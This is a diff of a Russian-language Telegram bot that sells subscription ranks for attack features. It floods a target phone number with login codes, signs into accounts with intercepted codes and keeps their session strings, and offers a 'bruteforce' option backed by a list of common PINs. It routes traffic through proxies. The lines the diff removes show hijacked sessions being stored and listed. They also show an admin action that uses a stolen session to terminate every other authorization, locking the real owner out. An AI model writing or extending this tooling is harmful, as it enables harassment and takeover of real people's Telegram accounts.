@@ -46,9 +46,6 @@ async def init_db():
                 rank TEXT DEFAULT 'user',
                 expire_date TEXT,
                 added_date TEXT,
-                daily_code_date TEXT,
-                ref_code TEXT,
-                ref_count INTEGER DEFAULT 0,
                 total_codes_sent INTEGER DEFAULT 0
             )
         """)
@@ -58,14 +55,6 @@ async def init_db():
                 session TEXT,
                 username TEXT,
                 first_name TEXT,
-                date TEXT
-            )
-        """)
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS stats (
-                id SERIAL PRIMARY KEY,
-                phone TEXT,
-                action TEXT,
                 date TEXT
             )
         """)
@@ -80,105 +69,32 @@ async def init_db():
         """)
     print("✅ PostgreSQL подключён")
 
-async def safe_db_query(query, *args):
-    async with db_pool.acquire() as conn:
-        return await conn.fetch(query, *args)
-
-async def safe_db_execute(query, *args):
-    async with db_pool.acquire() as conn:
-        await conn.execute(query, *args)
-
-async def add_user_db(user_id, ref_code=None):
-    await safe_db_execute(
-        "INSERT INTO users (user_id, rank, expire_date, added_date, ref_code) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (user_id) DO NOTHING",
-        user_id, 'user', None, datetime.now().isoformat(), ref_code
-    )
-
 async def get_user_rank(user_id):
     if user_id == ADMIN_ID:
         return 'admin', None
-    result = await safe_db_query("SELECT rank, expire_date FROM users WHERE user_id = $1", user_id)
-    if not result:
-        return 'user', None
-    rank, expire_date = result[0]['rank'], result[0]['expire_date']
-    if expire_date and datetime.now() > datetime.fromisoformat(expire_date):
-        await set_user_rank(user_id, 'user', None)
-        return 'user', None
-    return rank, expire_date
+    async with db_pool.acquire() as conn:
+        result = await conn.fetch("SELECT rank, expire_date FROM users WHERE user_id = $1", user_id)
+        if not result:
+            return 'user', None
+        rank, expire_date = result[0]['rank'], result[0]['expire_date']
+        if expire_date and datetime.now() > datetime.fromisoformat(expire_date):
+            await conn.execute("UPDATE users SET rank = 'user', expire_date = NULL WHERE user_id = $1", user_id)
+            return 'user', None
+        return rank, expire_date
 
 async def set_user_rank(user_id, rank, expire_date=None):
-    await safe_db_execute(
-        "UPDATE users SET rank = $1, expire_date = $2 WHERE user_id = $3",
-        rank, expire_date, user_id
-    )
+    async with db_pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO users (user_id, rank, expire_date) VALUES ($1, $2, $3) ON CONFLICT (user_id) DO UPDATE SET rank = $2, expire_date = $3",
+            user_id, rank, expire_date
+        )
 
-async def get_users_db():
-    result = await safe_db_query("SELECT user_id, rank, expire_date FROM users")
-    return [(r['user_id'], r['rank'], r['expire_date']) for r in result]
-
-async def save_session_db(phone, session, username, first_name):
-    await safe_db_execute(
-        "INSERT INTO sessions (phone, session, username, first_name, date) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (phone) DO UPDATE SET session = $2, username = $3, first_name = $4, date = $5",
-        phone, session, username, first_name, datetime.now().isoformat()
-    )
-
-async def get_all_sessions():
-    result = await safe_db_query("SELECT phone, session, username, first_name, date FROM sessions")
-    return [(r['phone'], r['session'], r['username'], r['first_name'], r['date']) for r in result]
-
-async def log_stats(phone, action):
-    await safe_db_execute(
-        "INSERT INTO stats (phone, action, date) VALUES ($1, $2, $3)",
-        phone, action, datetime.now().isoformat()
-    )
-
-async def get_stats_db():
-    total = await safe_db_query("SELECT COUNT(*) FROM stats")
-    last = await safe_db_query("SELECT phone, action, date FROM stats ORDER BY id DESC LIMIT 10")
-    return total[0]['count'], [(r['phone'], r['action'], r['date']) for r in last]
-
-async def log_action(user_id, action, details=''):
-    await safe_db_execute(
-        "INSERT INTO logs (user_id, action, details, date) VALUES ($1, $2, $3, $4)",
-        user_id, action, details, datetime.now().isoformat()
-    )
-
-async def get_logs(limit=20):
-    result = await safe_db_query("SELECT user_id, action, details, date FROM logs ORDER BY id DESC LIMIT $1", limit)
-    return [(r['user_id'], r['action'], r['details'], r['date']) for r in result]
-
-async def add_codes_sent(user_id, count):
-    await safe_db_execute(
-        "UPDATE users SET total_codes_sent = total_codes_sent + $1 WHERE user_id = $2",
-        count, user_id
-    )
-
-async def get_codes_sent(user_id):
-    result = await safe_db_query("SELECT total_codes_sent FROM users WHERE user_id = $1", user_id)
-    return result[0]['total_codes_sent'] if result else 0
-
-async def get_ref_count(user_id):
-    result = await safe_db_query("SELECT ref_count FROM users WHERE user_id = $1", user_id)
-    return result[0]['ref_count'] if result else 0
-
-async def add_ref_count(user_id, count=1):
-    await safe_db_execute(
-        "UPDATE users SET ref_count = ref_count + $1 WHERE user_id = $2",
-        count, user_id
-    )
-
-async def get_daily_code_status(user_id):
-    result = await safe_db_query("SELECT daily_code_date FROM users WHERE user_id = $1", user_id)
-    if not result or not result[0]['daily_code_date']:
-        return True
-    last_date = datetime.fromisoformat(result[0]['daily_code_date'])
-    return (datetime.now() - last_date).days >= 1
-
-async def set_daily_code_used(user_id):
-    await safe_db_execute(
-        "UPDATE users SET daily_code_date = $1 WHERE user_id = $2",
-        datetime.now().isoformat(), user_id
-    )
+async def add_user_db(user_id):
+    async with db_pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO users (user_id, added_date) VALUES ($1, $2) ON CONFLICT (user_id) DO NOTHING",
+            user_id, datetime.now().isoformat()
+        )
 
 # ===== НАСТРОЙКА =====
 logging.basicConfig(level=logging.INFO)
@@ -250,11 +166,6 @@ SMART_DICT = [
     "0606", "0707", "0808", "0909", "1010", "1111", "1212", "1231", "1225",
 ]
 
-# ===== ПОЛУЧАЕМ USERNAME =====
-async def get_bot_username():
-    me = await bot.get_me()
-    return me.username
-
 # ===== КЛАВИАТУРЫ =====
 def shop_keyboard():
     builder = InlineKeyboardBuilder()
@@ -306,8 +217,7 @@ def admin_keyboard():
         InlineKeyboardButton(text="📜 Логи", callback_data="admin_logs")
     )
     builder.row(
-        InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_notify"),
-        InlineKeyboardButton(text="🔑 Сброс сессий", callback_data="reset_sessions")
+        InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_notify")
     )
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
     return builder.as_markup()
@@ -415,7 +325,6 @@ async def spam_codes(phone, count, progress_callback=None):
         if result["success"]:
             sent += 1
             results.append(f"✅ Код {i+1} отправлен")
-            await log_stats(phone, f"spam_{i+1}")
         else:
             error = result.get("error", "")
             if "wait of" in error.lower():
@@ -444,9 +353,7 @@ async def login_with_code(phone, code):
         await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
         me = await client.get_me()
         session_string = client.session.save()
-        await save_session_db(phone, session_string, me.username, me.first_name)
-        await log_stats(phone, "login")
-        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone}
+        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone, "session": session_string}
     except Exception as e:
         return {"success": False, "error": str(e)}
     finally:
@@ -540,22 +447,10 @@ async def start(message: types.Message):
     }
     
     rank_display = rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')
-    if expire and rank != 'admin':
+    if expire:
         try:
             days = (datetime.fromisoformat(expire) - datetime.now()).days
             rank_display += f" (осталось {days} дн.)"
-        except:
-            pass
-    
-    args = message.text.split()
-    if len(args) > 1 and args[1].startswith("ref_"):
-        try:
-            ref_code = args[1][4:]
-            ref_user_id = int(ref_code)
-            if ref_user_id != user_id:
-                await add_ref_count(ref_user_id, 5)
-                await add_ref_count(user_id, 2)
-                await message.answer("🎁 +2 бонусных кода за переход по реферальной ссылке!")
         except:
             pass
     
@@ -578,7 +473,6 @@ async def main_keyboard(user_id):
             InlineKeyboardButton(text="🔑 Вход по коду", callback_data="login_code"),
             InlineKeyboardButton(text="⚡ Брутфорс", callback_data="bruteforce")
         )
-        builder.row(InlineKeyboardButton(text="✅ Сессии", callback_data="check_sessions"))
     
     if is_admin(user_id):
         builder.row(InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel"))
@@ -612,16 +506,10 @@ async def callback_handler(callback: types.CallbackQuery):
     
     if data == "profile":
         rank, expire = await get_user_rank(user_id)
-        ref_count = await get_ref_count(user_id)
-        codes_sent = await get_codes_sent(user_id)
         rank_names = {'admin': '👑 АДМИН', 'vip': '💎 VIP', 'antibot': '🤖 АнтиБот', 'unlock': '🔓 UNLOCK', 'user': '👤 ПОЛЬЗОВАТЕЛЬ'}
-        bot_username = await get_bot_username()
         await callback.message.edit_text(
             f"👤 ПРОФИЛЬ\n\n"
-            f"Ранг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}\n"
-            f"Реферальная ссылка: https://t.me/{bot_username}?start=ref_{user_id}\n"
-            f"Отправлено кодов: {codes_sent}\n"
-            f"Приведено друзей: {ref_count}",
+            f"Ранг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}",
             reply_markup=back_keyboard()
         )
         await callback.answer()
@@ -675,7 +563,7 @@ async def callback_handler(callback: types.CallbackQuery):
         if not is_admin(user_id):
             await callback.answer("❌ Только для админа", show_alert=True)
             return
-        await callback.message.edit_text("🤖 Введи номер для АнтиБот:", reply_markup=back_keyboard())
+        await callback.message.edit_text("🤖 Введи ID для АнтиБот:", reply_markup=back_keyboard())
         user_states[user_id] = {"action": "admin_set_antibot"}
         await callback.answer()
         return
@@ -702,14 +590,12 @@ async def callback_handler(callback: types.CallbackQuery):
         if not is_admin(user_id):
             await callback.answer("❌ Только для админа", show_alert=True)
             return
-        users = await get_users_db()
-        text = "📋 ПОЛЬЗОВАТЕЛИ:\n\n"
-        for u, rank, expire in users:
-            if u == ADMIN_ID:
-                status = "👑 ADMIN"
-            else:
-                status = f"{rank.upper()}" if rank != 'user' else "👤 USER"
-            text += f"{status} — {u}\n"
+        async with db_pool.acquire() as conn:
+            users = await conn.fetch("SELECT user_id, rank FROM users")
+            text = "📋 ПОЛЬЗОВАТЕЛИ:\n\n"
+            for u in users:
+                status = "👑 ADMIN" if u['user_id'] == ADMIN_ID else f"{u['rank'].upper()}"
+                text += f"{status} — {u['user_id']}\n"
         await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
         await callback.answer()
         return
@@ -718,11 +604,9 @@ async def callback_handler(callback: types.CallbackQuery):
         if not is_admin(user_id):
             await callback.answer("❌ Только для админа", show_alert=True)
             return
-        total, last = await get_stats_db()
-        text = f"📊 СТАТИСТИКА\n\nВсего действий: {total}\n"
-        for phone, action, date in last:
-            text += f"• {phone} — {action} ({date[:16]})\n"
-        await callback.message.edit_text(text, reply_markup=back_keyboard())
+        async with db_pool.acquire() as conn:
+            count = await conn.fetchval("SELECT COUNT(*) FROM users")
+        await callback.message.edit_text(f"📊 СТАТИСТИКА\n\nВсего пользователей: {count}", reply_markup=back_keyboard())
         await callback.answer()
         return
     
@@ -730,11 +614,7 @@ async def callback_handler(callback: types.CallbackQuery):
         if not is_admin(user_id):
             await callback.answer("❌ Только для админа", show_alert=True)
             return
-        logs = await get_logs(20)
-        text = "📜 ПОСЛЕДНИЕ ЛОГИ:\n\n"
-        for uid, action, details, date in logs:
-            text += f"👤 {uid}\n⚡ {action}\n📝 {details}\n🕐 {date[:16]}\n\n"
-        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
+        await callback.message.edit_text("📜 ЛОГИ\n\nВ разработке", reply_markup=back_keyboard())
         await callback.answer()
         return
     
@@ -744,27 +624,6 @@ async def callback_handler(callback: types.CallbackQuery):
             return
         await callback.message.edit_text("📨 Введи текст рассылки:", reply_markup=back_keyboard())
         user_states[user_id] = {"action": "admin_notify"}
-        await callback.answer()
-        return
-    
-    if data == "reset_sessions":
-        if not is_admin(user_id):
-            await callback.answer("❌ Только для админа", show_alert=True)
-            return
-        sessions = await get_all_sessions()
-        if not sessions:
-            await callback.message.edit_text("❌ Нет сессий", reply_markup=back_keyboard())
-            await callback.answer()
-            return
-        try:
-            phone, session, username, first_name, date = sessions[0]
-            client = TelegramClient(StringSession(session), random.choice(API_KEYS)["api_id"], random.choice(API_KEYS)["api_hash"])
-            await client.connect()
-            await client(functions.auth.ResetAuthorizationsRequest())
-            await client.disconnect()
-            await callback.message.edit_text(f"✅ Сессии сброшены для {phone}", reply_markup=back_keyboard())
-        except Exception as e:
-            await callback.message.edit_text(f"❌ Ошибка: {e}", reply_markup=back_keyboard())
         await callback.answer()
         return
     
@@ -794,18 +653,6 @@ async def callback_handler(callback: types.CallbackQuery):
         user_states[user_id] = {"action": "waiting_bruteforce"}
         await callback.answer()
         return
-    
-    if data == "check_sessions":
-        if rank not in ['vip', 'admin']:
-            await callback.answer("💎 Только для VIP", show_alert=True)
-            return
-        sessions = await get_all_sessions()
-        text = f"✅ СЕССИЙ: {len(sessions)}\n\n"
-        for phone, session, username, first_name, date in sessions:
-            text += f"📱 {phone} (@{username})\n"
-        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
-        await callback.answer()
-        return
 
 # ===== ОБРАБОТЧИК ТЕКСТА =====
 @dp.message()
@@ -813,7 +660,7 @@ async def text_handler(message: types.Message):
     user_id = message.from_user.id
     rank, _ = await get_user_rank(user_id)
     
-    if rank == 'user':
+    if rank == 'user' and not is_admin(user_id):
         await message.answer("🚫 Нет доступа. Купи подписку!")
         return
     
@@ -838,12 +685,11 @@ async def text_handler(message: types.Message):
             target = int(text)
             expire = (datetime.now() + timedelta(days=30)).isoformat()
             await set_user_rank(target, 'unlock', expire)
-            await log_action(user_id, "set_unlock", str(target))
+            await message.answer(f"✅ {target} теперь UNLOCK")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан UNLOCK на 30 дней")
             except:
                 pass
-            await message.answer(f"✅ {target} теперь UNLOCK")
         except:
             await message.answer("❌ Введи ID")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
@@ -860,12 +706,11 @@ async def text_handler(message: types.Message):
             target = int(text)
             expire = (datetime.now() + timedelta(days=30)).isoformat()
             await set_user_rank(target, 'vip', expire)
-            await log_action(user_id, "set_vip", str(target))
+            await message.answer(f"✅ {target} теперь VIP")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан VIP на 30 дней")
             except:
                 pass
-            await message.answer(f"✅ {target} теперь VIP")
         except:
             await message.answer("❌ Введи ID")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
@@ -878,49 +723,17 @@ async def text_handler(message: types.Message):
             await message.answer("❌ Только для админа")
             del user_states[user_id]
             return
-        
-        phone = text.strip()
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        sessions = await get_all_sessions()
-        target = None
-        
-        for p, session, username, first_name, date in sessions:
-            if p == phone:
-                client = None
-                try:
-                    client = TelegramClient(StringSession(session), random.choice(API_KEYS)["api_id"], random.choice(API_KEYS)["api_hash"])
-                    await client.connect()
-                    me = await client.get_me()
-                    users = await get_users_db()
-                    for u, rank, expire in users:
-                        if str(me.id) == str(u):
-                            target = u
-                            break
-                    if target:
-                        break
-                except:
-                    pass
-                finally:
-                    if client:
-                        try:
-                            await client.disconnect()
-                        except:
-                            pass
-        
-        if not target:
-            await message.answer(f"❌ Номер {phone} не найден")
-        else:
+        try:
+            target = int(text)
             expire = (datetime.now() + timedelta(days=30)).isoformat()
             await set_user_rank(target, 'antibot', expire)
-            await log_action(user_id, "set_antibot", str(target))
+            await message.answer(f"✅ {target} теперь АнтиБот")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан АнтиБот на 30 дней")
             except:
                 pass
-            await message.answer(f"✅ {target} теперь АнтиБот")
-        
+        except:
+            await message.answer("❌ Введи ID")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
         del user_states[user_id]
         return
@@ -937,12 +750,11 @@ async def text_handler(message: types.Message):
                 await message.answer("❌ Нельзя снять админа")
             else:
                 await set_user_rank(target, 'user', None)
-                await log_action(user_id, "remove_rank", str(target))
+                await message.answer(f"✅ Подписка снята с {target}")
                 try:
-                    await bot.send_message(target, "🚫 Ваша подписка снята")
+                    await bot.send_message(target, f"🚫 Ваша подписка снята")
                 except:
                     pass
-                await message.answer(f"✅ Подписка снята с {target}")
         except:
             await message.answer("❌ Введи ID")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
@@ -959,7 +771,6 @@ async def text_handler(message: types.Message):
         if phone in BLACKLIST_PHONES:
             BLACKLIST_PHONES.remove(phone)
             await message.answer(f"✅ {phone} удалён из ЧС")
-            await log_action(user_id, "remove_blacklist", phone)
         else:
             await message.answer(f"❌ {phone} не найден в ЧС")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
@@ -972,16 +783,16 @@ async def text_handler(message: types.Message):
             await message.answer("❌ Только для админа")
             del user_states[user_id]
             return
-        users = await get_users_db()
-        sent = 0
-        for u, rank, expire in users:
-            try:
-                await bot.send_message(u, text)
-                sent += 1
-                await asyncio.sleep(0.1)
-            except:
-                pass
-        await log_action(user_id, "notify", f"{sent} пользователей")
+        async with db_pool.acquire() as conn:
+            users = await conn.fetch("SELECT user_id FROM users")
+            sent = 0
+            for u in users:
+                try:
+                    await bot.send_message(u['user_id'], text)
+                    sent += 1
+                    await asyncio.sleep(0.1)
+                except:
+                    pass
         await message.answer(f"✅ Отправлено {sent} пользователям")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
         del user_states[user_id]
@@ -1031,7 +842,6 @@ async def text_handler(message: types.Message):
             f"📨 РЕЗУЛЬТАТ\n\nНомер: {phone}\nВсего: {count}\n✅ Успешно: {sent}\n❌ Ошибок: {failed}",
             reply_markup=await main_keyboard(user_id)
         )
-        await log_action(user_id, "spam", f"{phone} | {count}")
         del user_states[user_id]
         return
     
@@ -1056,7 +866,6 @@ async def text_handler(message: types.Message):
         result = await login_with_retry(phone, code)
         if result["success"]:
             await message.answer(f"✅ ВОШЁЛ\n\n👤 {result['first_name']}\n🔹 @{result['username']}", reply_markup=await main_keyboard(user_id))
-            await log_action(user_id, "login_success", phone)
         else:
             await message.answer(f"❌ {result['error']}", reply_markup=await main_keyboard(user_id))
         del user_states[user_id]
@@ -1098,9 +907,10 @@ async def text_handler(message: types.Message):
 
 # ===== ЗАПУСК =====
 async def main():
-    print("🤖 БОТ ЗАПУЩЕН")
+    print("🤖 БОТ ЗАПУЩЕН!")
     await init_db()
     load_proxies()
+    print(f"🌐 Прокси загружено: {len(PROXY_POOL)}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
